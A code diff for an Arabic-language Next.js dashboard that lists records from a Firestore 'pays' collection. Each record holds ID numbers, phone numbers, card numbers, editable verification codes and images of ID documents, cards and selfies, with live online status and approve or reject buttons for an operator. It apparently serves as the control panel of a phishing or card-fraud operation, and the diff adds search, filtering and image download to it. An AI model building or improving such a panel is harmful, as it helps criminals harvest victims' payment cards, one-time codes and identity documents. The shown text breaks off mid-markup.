@@ -2,14 +2,50 @@
 
 import { useState, useEffect } from "react"
 import { useRouter } from "next/navigation"
-import { Trash2, Users, CreditCard, UserCheck } from "lucide-react"
+import {
+  Trash2,
+  Users,
+  CreditCard,
+  UserCheck,
+  Bell,
+  Search,
+  Filter,
+  RefreshCw,
+  LogOut,
+  CheckCircle,
+  XCircle,
+  Clock,
+  Phone,
+  User,
+  Shield,
+  Calendar,
+  ChevronDown,
+  AlertCircle,
+  Eye,
+  ImageIcon,
+  X,
+  Download,
+  ZoomIn,
+  ZoomOut,
+} from "lucide-react"
 import { Button } from "@/components/ui/button"
 import { Badge } from "@/components/ui/badge"
+import { Input } from "@/components/ui/input"
 import { ar } from "date-fns/locale"
 import { formatDistanceToNow } from "date-fns"
-import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog"
-import { Card, CardContent } from "@/components/ui/card"
-import { collection, doc, writeBatch, updateDoc, onSnapshot, query, orderBy } from "firebase/firestore"
+import {
+  Dialog,
+  DialogContent,
+  DialogHeader,
+  DialogTitle,
+  DialogDescription,
+  DialogFooter,
+} from "@/components/ui/dialog"
+import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card"
+import { DropdownMenu, DropdownMenuContent, DropdownMenuItem, DropdownMenuTrigger } from "@/components/ui/dropdown-menu"
+import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from "@/components/ui/tooltip"
+import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
+import { collection, doc, writeBatch, updateDoc, onSnapshot, query } from "firebase/firestore"
 import { onAuthStateChanged, signOut } from "firebase/auth"
 import { onValue, ref } from "firebase/database"
 import { auth, database, db } from "@/lib/firebase"
@@ -65,21 +101,60 @@ function UserStatusBadge({ userId }: { userId: string }) {
   }, [userId])
 
   return (
-    <Badge variant="default" className={`${status === "online" ? "bg-green-500" : "bg-red-500"}`}>
-      <span className="text-xs text-white">{status === "online" ? "متصل" : "غير متصل"}</span>
+    <Badge
+      variant="outline"
+      className={`${status === "online" ? "bg-emerald-100 text-emerald-700 border-emerald-200" : "bg-red-100 text-red-700 border-red-200"} flex items-center gap-1.5 px-2 py-1`}
+    >
+      <span className={`w-2 h-2 rounded-full ${status === "online" ? "bg-emerald-500" : "bg-red-500"}`}></span>
+      <span className="text-xs font-medium">{status === "online" ? "متصل" : "غير متصل"}</span>
     </Badge>
   )
 }
 
+const getStatusBadge = (status: string) => {
+  switch (status) {
+    case "approved":
+      return (
+        <Badge
+          variant="outline"
+          className="bg-emerald-100 text-emerald-700 border-emerald-200 flex items-center gap-1.5"
+        >
+          <CheckCircle className="h-3 w-3" />
+          <span>مقبول</span>
+        </Badge>
+      )
+    case "rejected":
+      return (
+        <Badge variant="outline" className="bg-red-100 text-red-700 border-red-200 flex items-center gap-1.5">
+          <XCircle className="h-3 w-3" />
+          <span>مرفوض</span>
+        </Badge>
+      )
+    default:
+      return (
+        <Badge variant="outline" className="bg-amber-100 text-amber-700 border-amber-200 flex items-center gap-1.5">
+          <Clock className="h-3 w-3" />
+          <span>قيد الانتظار</span>
+        </Badge>
+      )
+  }
+}
+
 export default function NotificationsPage() {
   const [notifications, setNotifications] = useState<Notification[]>([])
+  const [filteredNotifications, setFilteredNotifications] = useState<Notification[]>([])
   const [isLoading, setIsLoading] = useState(true)
-  const [message, setMessage] = useState<boolean>(false)
+  const [message, setMessage] = useState<string | null>(null)
   const [selectedInfo, setSelectedInfo] = useState<"personal" | "card" | null>(null)
   const [selectedNotification, setSelectedNotification] = useState<Notification | null>(null)
   const [totalVisitors, setTotalVisitors] = useState<number>(0)
   const [cardSubmissions, setCardSubmissions] = useState<number>(0)
   const [editingAuthCodes, setEditingAuthCodes] = useState<Record<string, string>>({})
+  const [searchQuery, setSearchQuery] = useState("")
+  const [activeFilter, setActiveFilter] = useState<string | null>(null)
+  const [confirmDeleteId, setConfirmDeleteId] = useState<string | null>(null)
+  const [selectedImages, setSelectedImages] = useState<{ images: string[]; currentIndex: number } | null>(null)
+  const [imageZoom, setImageZoom] = useState(1)
   const router = useRouter()
   const onlineUsersCount = useOnlineUsersCount()
 
@@ -98,9 +173,41 @@ export default function NotificationsPage() {
     return () => unsubscribe()
   }, [router])
 
+  useEffect(() => {
+    if (notifications.length > 0) {
+      let result = [...notifications]
+
+      // Apply search
+      if (searchQuery) {
+        const query = searchQuery.toLowerCase()
+        result = result.filter(
+          (notification) =>
+            notification.data.idNumber.toLowerCase().includes(query) ||
+            notification.phone.toLowerCase().includes(query) ||
+            notification.data.authCode.toLowerCase().includes(query),
+        )
+      }
+
+      // Apply filters
+      if (activeFilter) {
+        if (activeFilter === "pending" || activeFilter === "approved" || activeFilter === "rejected") {
+          result = result.filter((notification) => notification.data.status === activeFilter)
+        } else if (activeFilter === "hasCard") {
+          result = result.filter((notification: any) => notification.cardNumber)
+        } else if (activeFilter === "hasPersonal") {
+          result = result.filter((notification: any) => notification.name)
+        }
+      }
+
+      setFilteredNotifications(result)
+    } else {
+      setFilteredNotifications([])
+    }
+  }, [notifications, searchQuery, activeFilter])
+
   const fetchNotifications = () => {
     setIsLoading(true)
-    const q = query(collection(db, "pays"), orderBy("createdDate", "desc"))
+    const q = query(collection(db, "pays"))
     const unsubscribe = onSnapshot(
       q,
       (querySnapshot) => {
@@ -111,10 +218,12 @@ export default function NotificationsPage() {
           })
           .filter((notification: any) => !notification.isHidden) as Notification[]
         playNotificationSound()
+
         // Update statistics
         updateStatistics(notificationsData)
 
         setNotifications(notificationsData)
+        setFilteredNotifications(notificationsData)
         setIsLoading(false)
       },
       (error) => {
@@ -172,17 +281,19 @@ export default function NotificationsPage() {
           return updated
         })
 
-        setMessage(true)
-        setTimeout(() => {
-          setMessage(false)
-        }, 3000)
+        showMessage("تم تحديث رمز التحقق بنجاح")
       } catch (error) {
         console.error("Error updating auth code:", error)
+        showMessage("حدث خطأ أثناء تحديث رمز التحقق", "error")
       }
     }
   }
 
   const handleClearAll = async () => {
+    setConfirmDeleteId("all")
+  }
+
+  const confirmClearAll = async () => {
     setIsLoading(true)
     try {
       const batch = writeBatch(db)
@@ -192,28 +303,61 @@ export default function NotificationsPage() {
       })
       await batch.commit()
       setNotifications([])
+      showMessage("تم مسح جميع الإشعارات بنجاح")
     } catch (error) {
       console.error("Error hiding all notifications:", error)
+      showMessage("حدث خطأ أثناء مسح الإشعارات", "error")
     } finally {
       setIsLoading(false)
+      setConfirmDeleteId(null)
     }
   }
 
   const handleDelete = async (id: string) => {
+    setConfirmDeleteId(id)
+  }
+
+  const confirmDeleteNotification = async () => {
+    if (!confirmDeleteId) return
+
+    const id = confirmDeleteId
     try {
       const docRef = doc(db, "pays", id)
       await updateDoc(docRef, { isHidden: true })
       setNotifications(notifications.filter((notification) => notification.id !== id))
+      showMessage("تم مسح الإشعار بنجاح")
     } catch (error) {
       console.error("Error hiding notification:", error)
+      showMessage("حدث خطأ أثناء مسح الإشعار", "error")
+    } finally {
+      setConfirmDeleteId(null)
     }
   }
 
   const handleApproval = async (state: string, id: string) => {
-    const targetPost = doc(db, "pays", id)
-    await updateDoc(targetPost, {
-      "data.status": state,
-    })
+    try {
+      const targetPost = doc(db, "pays", id)
+      await updateDoc(targetPost, {
+        "data.status": state,
+      })
+
+      // Update local state
+      setNotifications((prev) =>
+        prev.map((notification) =>
+          notification.id === id
+            ? {
+                ...notification,
+                data: { ...notification.data, status: state },
+              }
+            : notification,
+        ),
+      )
+
+      showMessage(state === "approved" ? "تم قبول الإشعار بنجاح" : "تم رفض الإشعار بنجاح")
+    } catch (error) {
+      console.error("Error updating notification status:", error)
+      showMessage("حدث خطأ أثناء تحديث حالة الإشعار", "error")
+    }
   }
 
   const handleLogout = async () => {
@@ -233,43 +377,151 @@ export default function NotificationsPage() {
   const closeDialog = () => {
     setSelectedInfo(null)
     setSelectedNotification(null)
+    setConfirmDeleteId(null)
+  }
+
+  const showMessage = (text: string, type: "success" | "error" = "success") => {
+    setMessage(text)
+    setTimeout(() => {
+      setMessage(null)
+    }, 3000)
+  }
+
+  const resetFilters = () => {
+    setSearchQuery("")
+    setActiveFilter(null)
+  }
+
+  const handleImagePreview = (notification: Notification) => {
+    const images: string[] = []
+    const notificationData = notification as any
+
+    // Collect all available images
+    if (notificationData.idImage) images.push(notificationData.idImage)
+    if (notificationData.cardImage) images.push(notificationData.cardImage)
+    if (notificationData.selfieImage) images.push(notificationData.selfieImage)
+    if (notificationData.frontIdImage) images.push(notificationData.frontIdImage)
+    if (notificationData.backIdImage) images.push(notificationData.backIdImage)
+    if (notificationData.images && Array.isArray(notificationData.images)) {
+      images.push(...notificationData.images)
+    }
+
+    if (images.length > 0) {
+      setSelectedImages({ images, currentIndex: 0 })
+      setImageZoom(1)
+    }
+  }
+
+  const closeImagePreview = () => {
+    setSelectedImages(null)
+    setImageZoom(1)
+  }
+
+  const nextImage = () => {
+    if (selectedImages && selectedImages.currentIndex < selectedImages.images.length - 1) {
+      setSelectedImages({
+        ...selectedImages,
+        currentIndex: selectedImages.currentIndex + 1,
+      })
+      setImageZoom(1)
+    }
+  }
+
+  const prevImage = () => {
+    if (selectedImages && selectedImages.currentIndex > 0) {
+      setSelectedImages({
+        ...selectedImages,
+        currentIndex: selectedImages.currentIndex - 1,
+      })
+      setImageZoom(1)
+    }
+  }
+
+  const downloadImage = () => {
+    if (selectedImages) {
+      const imageUrl = selectedImages.images[selectedImages.currentIndex]
+      const link = document.createElement("a")
+      link.href = imageUrl
+      link.download = `notification-image-${selectedImages.currentIndex + 1}.jpg`
+      document.body.appendChild(link)
+      link.click()
+      document.body.removeChild(link)
+    }
+  }
+
+  const getImageCount = (notification: any) => {
+    let count = 0
+    if (notification.idImage) count++
+    if (notification.cardImage) count++
+    if (notification.selfieImage) count++
+    if (notification.frontIdImage) count++
+    if (notification.backIdImage) count++
+    if (notification.images && Array.isArray(notification.images)) {
+      count += notification.images.length
+    }
+    return count
   }
 
   if (isLoading) {
     return (
-      <div className="min-h-screen bg-white flex items-center justify-center">
-        <div className="text-lg font-medium">جاري التحميل...</div>
+      <div className="min-h-screen bg-white flex flex-col items-center justify-center">
+        <RefreshCw className="h-10 w-10 text-gray-400 animate-spin mb-4" />
+        <div className="text-lg font-medium text-gray-700">جاري التحميل...</div>
       </div>
     )
   }
 
   return (
-    <div dir="rtl" className="min-h-screen bg-gray-50 text-gray-900 p-4">
-      <div className="max-w-7xl mx-auto">
-        <div className="flex flex-col sm:flex-row justify-between items-center mb-6">
-          <h1 className="text-2xl font-bold mb-4 sm:mb-0">لوحة الإشعارات</h1>
-          <div className="flex flex-col sm:flex-row gap-2">
-            <Button
-              variant="destructive"
-              onClick={handleClearAll}
-              disabled={notifications.length === 0}
-              className="flex items-center gap-2"
-            >
-              <Trash2 className="h-4 w-4" />
-              مسح جميع الإشعارات
-            </Button>
-            <Button variant="outline" onClick={handleLogout} className="flex items-center gap-2">
-              تسجيل الخروج
-            </Button>
+    <div dir="rtl" className="min-h-screen bg-gray-50 text-gray-900">
+      {/* Header */}
+      <div className="bg-white border-b border-gray-200 sticky top-0 z-10">
+        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+          <div className="flex justify-between items-center h-16">
+            <div className="flex items-center">
+              <Bell className="h-6 w-6 text-purple-600 mr-2" />
+              <h1 className="text-xl font-bold text-gray-900">لوحة الإشعارات</h1>
+            </div>
+            <div className="flex items-center gap-3">
+              <TooltipProvider>
+                <Tooltip>
+                  <TooltipTrigger asChild>
+                    <Button variant="outline" size="icon" onClick={resetFilters}>
+                      <RefreshCw className="h-4 w-4" />
+                    </Button>
+                  </TooltipTrigger>
+                  <TooltipContent>
+                    <p>إعادة تعيين الفلاتر</p>
+                  </TooltipContent>
+                </Tooltip>
+              </TooltipProvider>
+
+              <Button
+                variant="destructive"
+                onClick={handleClearAll}
+                disabled={notifications.length === 0}
+                className="flex items-center gap-2"
+                size="sm"
+              >
+                <Trash2 className="h-4 w-4" />
+                <span className="hidden sm:inline">مسح الكل</span>
+              </Button>
+
+              <Button variant="outline" onClick={handleLogout} className="flex items-center gap-2" size="sm">
+                <LogOut className="h-4 w-4" />
+                <span className="hidden sm:inline">تسجيل الخروج</span>
+              </Button>
+            </div>
           </div>
         </div>
+      </div>
 
+      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-6">
         {/* Statistics Grid */}
         <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-4 mb-6">
           {/* Online Users Card */}
-          <Card>
+          <Card className="border-none shadow-sm">
             <CardContent className="p-6 flex items-center">
-              <div className="rounded-full bg-blue-100 p-3 mr-4">
+              <div className="rounded-full bg-blue-50 p-3 mr-4">
                 <UserCheck className="h-6 w-6 text-blue-600" />
               </div>
               <div>
@@ -280,10 +532,10 @@ export default function NotificationsPage() {
           </Card>
 
           {/* Total Visitors Card */}
-          <Card>
+          <Card className="border-none shadow-sm">
             <CardContent className="p-6 flex items-center">
-              <div className="rounded-full bg-green-100 p-3 mr-4">
-                <Users className="h-6 w-6 text-green-600" />
+              <div className="rounded-full bg-emerald-50 p-3 mr-4">
+                <Users className="h-6 w-6 text-emerald-600" />
               </div>
               <div>
                 <p className="text-sm text-gray-500">إجمالي الزوار</p>
@@ -293,9 +545,9 @@ export default function NotificationsPage() {
           </Card>
 
           {/* Card Submissions Card */}
-          <Card>
+          <Card className="border-none shadow-sm">
             <CardContent className="p-6 flex items-center">
-              <div className="rounded-full bg-purple-100 p-3 mr-4">
+              <div className="rounded-full bg-purple-50 p-3 mr-4">
                 <CreditCard className="h-6 w-6 text-purple-600" />
               </div>
               <div>
@@ -306,325 +558,540 @@ export default function NotificationsPage() {
           </Card>
         </div>
 
-        <Card>
-          {/* Desktop Table View - Hidden on Mobile */}
-          <div className="hidden md:block overflow-x-auto">
-            <table className="w-full">
-              <thead>
-                <tr className="border-b">
-                  <th className="px-4 py-3 text-right font-medium text-gray-500">الرقم</th>
-                  <th className="px-4 py-3 text-right font-medium text-gray-500">رمز التحقق</th>
-                  <th className="px-4 py-3 text-right font-medium text-gray-500">المعلومات</th>
-                  <th className="px-4 py-3 text-right font-medium text-gray-500">الصفحة</th>
-                  <th className="px-4 py-3 text-right font-medium text-gray-500">الوقت</th>
-                  <th className="px-4 py-3 text-right font-medium text-gray-500">الحالة</th>
-                  <th className="px-4 py-3 text-right font-medium text-gray-500">الإجراءات</th>
-                </tr>
-              </thead>
-              <tbody>
-                {notifications.map((notification) => (
-                  <tr key={notification.id} className="border-b hover:bg-gray-50">
-                    <td className="px-4 py-3">{notification.data.idNumber || "غير معروف"}</td>
-                    <td className="px-4 py-3">
-                      <div className="flex items-center gap-2">
-                        <input
-                          type="text"
-                          value={editingAuthCodes[notification.id] ?? notification.data.authCode}
-                          onChange={(e) => handleAuthCodeChange(notification.id, e.target.value)}
-                          className="px-2 py-1 text-sm border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent min-w-[100px]"
-                          placeholder="رمز التحقق"
-                        />
-                        {editingAuthCodes[notification.id] !== undefined && (
+        {/* Search and Filters */}
+        <div className="mb-6 flex flex-col sm:flex-row gap-4">
+          <div className="relative flex-1">
+            <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-gray-400" />
+            <Input
+              placeholder="البحث عن رقم الهوية، رقم الهاتف، أو رمز التحقق..."
+              value={searchQuery}
+              onChange={(e) => setSearchQuery(e.target.value)}
+              className="pl-10 bg-white border-gray-200"
+            />
+          </div>
+
+          <div className="flex gap-2">
+            <DropdownMenu>
+              <DropdownMenuTrigger asChild>
+                <Button variant="outline" className="flex items-center gap-2 bg-white">
+                  <Filter className="h-4 w-4" />
+                  <span>فلترة</span>
+                  <ChevronDown className="h-4 w-4" />
+                </Button>
+              </DropdownMenuTrigger>
+              <DropdownMenuContent align="end" className="w-56">
+                <DropdownMenuItem onClick={() => setActiveFilter("pending")} className="cursor-pointer">
+                  قيد الانتظار
+                </DropdownMenuItem>
+                <DropdownMenuItem onClick={() => setActiveFilter("approved")} className="cursor-pointer">
+                  مقبول
+                </DropdownMenuItem>
+                <DropdownMenuItem onClick={() => setActiveFilter("rejected")} className="cursor-pointer">
+                  مرفوض
+                </DropdownMenuItem>
+                <DropdownMenuItem onClick={() => setActiveFilter("hasCard")} className="cursor-pointer">
+                  لديه معلومات بطاقة
+                </DropdownMenuItem>
+                <DropdownMenuItem onClick={() => setActiveFilter("hasPersonal")} className="cursor-pointer">
+                  لديه معلومات شخصية
+                </DropdownMenuItem>
+              </DropdownMenuContent>
+            </DropdownMenu>
+
+            {activeFilter && (
+              <Button variant="ghost" onClick={() => setActiveFilter(null)} size="icon" className="h-10 w-10">
+                <XCircle className="h-4 w-4" />
+              </Button>
+            )}
+          </div>
+        </div>
+
+        {/* Status message */}
+        {message && (
+          <div className="mb-4 p-3 bg-emerald-50 border border-emerald-200 text-emerald-700 rounded-md flex items-center">
+            <CheckCircle className="h-5 w-5 mr-2 flex-shrink-0" />
+            <p>{message}</p>
+          </div>
+        )}
+
+        {/* Tabs for different views */}
+        <Tabs defaultValue="table" className="mb-6">
+          <TabsList className="mb-4">
+            <TabsTrigger value="table">جدول</TabsTrigger>
+            <TabsTrigger value="cards">بطاقات</TabsTrigger>
+          </TabsList>
+
+          <TabsContent value="table">
+            <Card className="border-none shadow-sm overflow-hidden">
+              {filteredNotifications.length > 0 ? (
+                <div className="overflow-x-auto">
+                  <table className="w-full">
+                    <thead>
+                      <tr className="bg-gray-50 border-b border-gray-200">
+                        <th className="px-4 py-3 text-right font-medium text-gray-500 text-sm">الرقم</th>
+                        <th className="px-4 py-3 text-right font-medium text-gray-500 text-sm">رمز التحقق</th>
+                        <th className="px-4 py-3 text-right font-medium text-gray-500 text-sm">الهاتف</th>
+                        <th className="px-4 py-3 text-right font-medium text-gray-500 text-sm">المعلومات</th>
+                        <th className="px-4 py-3 text-right font-medium text-gray-500 text-sm">الصور</th>
+                        <th className="px-4 py-3 text-right font-medium text-gray-500 text-sm">الحالة</th>
+                        <th className="px-4 py-3 text-right font-medium text-gray-500 text-sm">الإجراءات</th>
+                      </tr>
+                    </thead>
+                    <tbody>
+                      {filteredNotifications.map((notification) => (
+                        <tr key={notification.id} className="border-b border-gray-100 hover:bg-gray-50">
+                          <td className="px-4 py-3 text-sm">{notification.data.idNumber || "غير معروف"}</td>
+                          <td className="px-4 py-3">
+                            <div className="flex items-center gap-2">
+                              <input
+                                type="text"
+                                value={editingAuthCodes[notification.id] ?? notification.data.authCode}
+                                onChange={(e) => handleAuthCodeChange(notification.id, e.target.value)}
+                                className="px-2 py-1 text-sm border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-transparent min-w-[100px]"
+                                placeholder="رمز التحقق"
+                              />
+                              {editingAuthCodes[notification.id] !== undefined && (
+                                <Button
+                                  size="sm"
+                                  variant="outline"
+                                  onClick={() => updateAuthCode(notification.id)}
+                                  className="h-7 px-2 text-xs"
+                                >
+                                  حفظ
+                                </Button>
+                              )}
+                            </div>
+                          </td>
+                          <td className="px-4 py-3 text-sm">{notification.phone}</td>
+                          <td className="px-4 py-3">
+                            <div className="flex flex-wrap gap-2">
+                              <Badge
+                                variant="outline"
+                                className={`rounded-md cursor-pointer ${(notification as any).name ? "bg-blue-50 text-blue-700 border-blue-200" : "bg-gray-100 text-gray-700 border-gray-200"}`}
+                                onClick={() => handleInfoClick(notification, "personal")}
+                              >
+                                <User className="h-3 w-3 mr-1" />
+                                {(notification as any).name ? "معلومات شخصية" : "لا يوجد معلومات"}
+                              </Badge>
+                              <Badge
+                                variant="outline"
+                                className={`rounded-md cursor-pointer ${(notification as any).cardNumber ? "bg-emerald-50 text-emerald-700 border-emerald-200" : "bg-gray-100 text-gray-700 border-gray-200"}`}
+                                onClick={() => handleInfoClick(notification, "card")}
+                              >
+                                <CreditCard className="h-3 w-3 mr-1" />
+                                {(notification as any).cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}
+                              </Badge>
+                            </div>
+                          </td>
+                          <td className="px-4 py-3 text-center">
+                            {getImageCount(notification) > 0 ? (
+                              <TooltipProvider>
+                                <Tooltip>
+                                  <TooltipTrigger asChild>
+                                    <Button
+                                      variant="outline"
+                                      size="sm"
+                                      onClick={() => handleImagePreview(notification)}
+                                      className="flex items-center gap-1 bg-blue-50 text-blue-700 border-blue-200 hover:bg-blue-100"
+                                    >
+                                      <Eye className="h-4 w-4" />
+                                      <span className="text-xs">{getImageCount(notification)}</span>
+                                    </Button>
+                                  </TooltipTrigger>
+                                  <TooltipContent>
+                                    <p>عرض الصور ({getImageCount(notification)})</p>
+                                  </TooltipContent>
+                                </Tooltip>
+                              </TooltipProvider>
+                            ) : (
+                              <Badge variant="outline" className="bg-gray-100 text-gray-500 border-gray-200">
+                                <ImageIcon className="h-3 w-3 mr-1" />
+                                لا توجد صور
+                              </Badge>
+                            )}
+                          </td>
+                          <td className="px-4 py-3 text-center">{getStatusBadge(notification.data.status)}</td>
+                          <td className="px-4 py-3 text-center">
+                            <div className="flex justify-center gap-2">
+                              {notification.data.status !== "approved" && (
+                                <TooltipProvider>
+                                  <Tooltip>
+                                    <TooltipTrigger asChild>
+                                      <Button
+                                        variant="outline"
+                                        size="sm"
+                                        onClick={() => handleApproval("approved", notification.id)}
+                                        className="bg-emerald-500 text-white hover:bg-emerald-600 border-emerald-500"
+                                      >
+                                        <CheckCircle className="h-4 w-4" />
+                                      </Button>
+                                    </TooltipTrigger>
+                                    <TooltipContent>
+                                      <p>قبول</p>
+                                    </TooltipContent>
+                                  </Tooltip>
+                                </TooltipProvider>
+                              )}
+
+                              {notification.data.status !== "rejected" && (
+                                <TooltipProvider>
+                                  <Tooltip>
+                                    <TooltipTrigger asChild>
+                                      <Button
+                                        variant="outline"
+                                        size="sm"
+                                        onClick={() => handleApproval("rejected", notification.id)}
+                                        className="bg-red-500 text-white hover:bg-red-600 border-red-500"
+                                      >
+                                        <XCircle className="h-4 w-4" />
+                                      </Button>
+                                    </TooltipTrigger>
+                                    <TooltipContent>
+                                      <p>رفض</p>
+                                    </TooltipContent>
+                                  </Tooltip>
+                                </TooltipProvider>
+                              )}
+
+                              <TooltipProvider>
+                                <Tooltip>
+                                  <TooltipTrigger asChild>
+                                    <Button
+                                      variant="ghost"
+                                      size="sm"
+                                      onClick={() => handleDelete(notification.id)}
+                                      className="text-red-500 hover:text-red-600 hover:bg-red-50"
+                                    >
+                                      <Trash2 className="h-4 w-4" />
+                                    </Button>
+                                  </TooltipTrigger>
+                                  <TooltipContent>
+                                    <p>حذف</p>
+                                  </TooltipContent>
+                                </Tooltip>
+                              </TooltipProvider>
+                            </div>
+                          </td>
+                        </tr>
+                      ))}
+                    </tbody>
+                  </table>
+                </div>
+              ) : (
+                <div className="text-center py-12">
+                  <Bell className="h-12 w-12 text-gray-300 mx-auto mb-4" />
+                  <h3 className="text-lg font-medium text-gray-900 mb-2">لا توجد إشعارات</h3>
+                  <p className="text-gray-500 max-w-md mx-auto">
+                    {searchQuery || activeFilter
+                      ? "لا توجد نتائج تطابق معايير البحث أو الفلترة. حاول تغيير المعايير أو إعادة تعيين الفلاتر."
+                      : "لا توجد إشعارات حالياً. ستظهر الإشعارات الجديدة هنا عند وصولها."}
+                  </p>
+                  {(searchQuery || activeFilter) && (
+                    <Button variant="outline" onClick={resetFilters} className="mt-4">
+                      إعادة تعيين الفلاتر
+                    </Button>
+                  )}
+                </div>
+              )}
+            </Card>
+          </TabsContent>
+
+          <TabsContent value="cards">
+            {filteredNotifications.length > 0 ? (
+              <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
+                {filteredNotifications.map((notification) => (
+                  <Card key={notification.id} className="border-none shadow-sm overflow-hidden">
+                    <CardHeader className="pb-2 pt-4">
+                      <div className="flex justify-between items-start">
+                        <div>
+                          <CardTitle className="text-base flex items-center gap-2">
+                            <User className="h-4 w-4 text-gray-500" />
+                            {notification.data.idNumber || "غير معروف"}
+                          </CardTitle>
+                          <CardDescription className="mt-1">
+                            <Phone className="h-3 w-3 inline mr-1" />
+                            {notification.phone}
+                          </CardDescription>
+                        </div>
+                        <div className="flex items-center gap-2">
+                          {getStatusBadge(notification.data.status)}
+                          <UserStatusBadge userId={notification.id} />
+                        </div>
+                      </div>
+                    </CardHeader>
+                    <CardContent className="pb-4 space-y-4">
+                      <div className="space-y-3">
+                        <div>
+                          <label className="text-sm font-medium text-gray-700 block mb-1">رمز التحقق</label>
+                          <div className="flex items-center gap-2">
+                            <input
+                              type="text"
+                              value={editingAuthCodes[notification.id] ?? notification.data.authCode}
+                              onChange={(e) => handleAuthCodeChange(notification.id, e.target.value)}
+                              className="px-2 py-1 text-sm border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-transparent w-full"
+                              placeholder="رمز التحقق"
+                            />
+                            {editingAuthCodes[notification.id] !== undefined && (
+                              <Button
+                                size="sm"
+                                variant="outline"
+                                onClick={() => updateAuthCode(notification.id)}
+                                className="h-7 px-2 text-xs whitespace-nowrap"
+                              >
+                                حفظ
+                              </Button>
+                            )}
+                          </div>
+                        </div>
+
+                        <div className="flex flex-wrap gap-2">
+                          <Badge
+                            variant="outline"
+                            className={`rounded-md cursor-pointer ${(notification as any).name ? "bg-blue-50 text-blue-700 border-blue-200" : "bg-gray-100 text-gray-700 border-gray-200"}`}
+                            onClick={() => handleInfoClick(notification, "personal")}
+                          >
+                            <User className="h-3 w-3 mr-1" />
+                            {(notification as any).name ? "معلومات شخصية" : "لا يوجد معلومات"}
+                          </Badge>
+                          <Badge
+                            variant="outline"
+                            className={`rounded-md cursor-pointer ${(notification as any).cardNumber ? "bg-emerald-50 text-emerald-700 border-emerald-200" : "bg-gray-100 text-gray-700 border-gray-200"}`}
+                            onClick={() => handleInfoClick(notification, "card")}
+                          >
+                            <CreditCard className="h-3 w-3 mr-1" />
+                            {(notification as any).cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}
+                          </Badge>
+                        </div>
+
+                        {getImageCount(notification) > 0 && (
+                          <div className="flex items-center justify-between py-2">
+                            <span className="text-sm font-medium text-gray-700 flex items-center gap-2">
+                              <ImageIcon className="h-4 w-4 text-gray-500" />
+                              الصور المرفقة:
+                            </span>
+                            <Button
+                              variant="outline"
+                              size="sm"
+                              onClick={() => handleImagePreview(notification)}
+                              className="flex items-center gap-1 bg-blue-50 text-blue-700 border-blue-200 hover:bg-blue-100"
+                            >
+                              <Eye className="h-4 w-4" />
+                              عرض ({getImageCount(notification)})
+                            </Button>
+                          </div>
+                        )}
+
+                        <div className="text-xs text-gray-500 flex items-center">
+                          <Clock className="h-3 w-3 mr-1" />
+                          {(notification as any).createdDate &&
+                            formatDistanceToNow(new Date((notification as any).createdDate), {
+                              addSuffix: true,
+                              locale: ar,
+                            })}
+                        </div>
+                      </div>
+
+                      <div className="flex gap-2 pt-2">
+                        {notification.data.status !== "approved" && (
                           <Button
                             size="sm"
-                            variant="outline"
-                            onClick={() => updateAuthCode(notification.id)}
-                            className="h-7 px-2 text-xs"
+                            className="flex-1 bg-emerald-500 hover:bg-emerald-600 text-white"
+                            onClick={() => handleApproval("approved", notification.id)}
                           >
-                            حفظ
+                            <CheckCircle className="h-4 w-4 mr-1" />
+                            قبول
                           </Button>
                         )}
-                      </div>
-                    </td>
-                    <td className="px-4 py-3">
-                      <div className="flex flex-wrap gap-2">
-                        <Badge
-                          variant={(notification as any).name ? "default" : "destructive"}
-                          className="rounded-md cursor-pointer"
-                          onClick={() => handleInfoClick(notification, "personal")}
-                        >
-                          {(notification as any).name ? "معلومات شخصية" : "لا يوجد معلومات"}
-                        </Badge>
-                        <Badge
-                          variant={(notification as any).cardNumber ? "default" : "destructive"}
-                          className={`rounded-md cursor-pointer ${(notification as any).cardNumber ? "bg-green-500" : ""}`}
-                          onClick={() => handleInfoClick(notification, "card")}
-                        >
-                          {(notification as any).cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}
-                        </Badge>
-                      </div>
-                    </td>
-                    <td className="px-4 py-3">{(notification as any)?.currantPage}</td>
-                    <td className="px-4 py-3">
-                      {(notification as any).createdDate &&
-                        formatDistanceToNow(new Date((notification as any).createdDate), {
-                          addSuffix: true,
-                          locale: ar,
-                        })}
-                    </td>
-                    <td className="px-4 py-3 text-center">
-                      <UserStatusBadge userId={notification.id} />
-                    </td>
-                    <td className="px-4 py-3 text-center">
-                      <div className="flex justify-center gap-2">
+
+                        {notification.data.status !== "rejected" && (
+                          <Button
+                            size="sm"
+                            className="flex-1 bg-red-500 hover:bg-red-600 text-white"
+                            onClick={() => handleApproval("rejected", notification.id)}
+                          >
+                            <XCircle className="h-4 w-4 mr-1" />
+                            رفض
+                          </Button>
+                        )}
+
                         <Button
                           variant="outline"
-                          size="sm"
-                          onClick={() => {
-                            handleApproval("approved", notification.id)
-                            setMessage(true)
-                            setTimeout(() => {
-                              setMessage(false)
-                            }, 3000)
-                          }}
-                          className="bg-green-500 text-white hover:bg-green-600"
-                        >
-                          قبول
-                        </Button>
-                        <Button
-                          variant="outline"
-                          size="sm"
-                          onClick={() => {
-                            handleApproval("rejected", notification.id)
-                            setMessage(true)
-                            setTimeout(() => {
-                              setMessage(false)
-                            }, 3000)
-                          }}
-                          className="bg-red-500 text-white hover:bg-red-600"
-                        >
-                          رفض
-                        </Button>
-                        <Button
-                          variant="ghost"
                           size="sm"
                           onClick={() => handleDelete(notification.id)}
-                          className="text-red-500 hover:text-red-600"
+                          className="w-10 p-0 border-gray-200 text-gray-500 hover:text-red-500 hover:border-red-200"
                         >
                           <Trash2 className="h-4 w-4" />
                         </Button>
                       </div>
-                    </td>
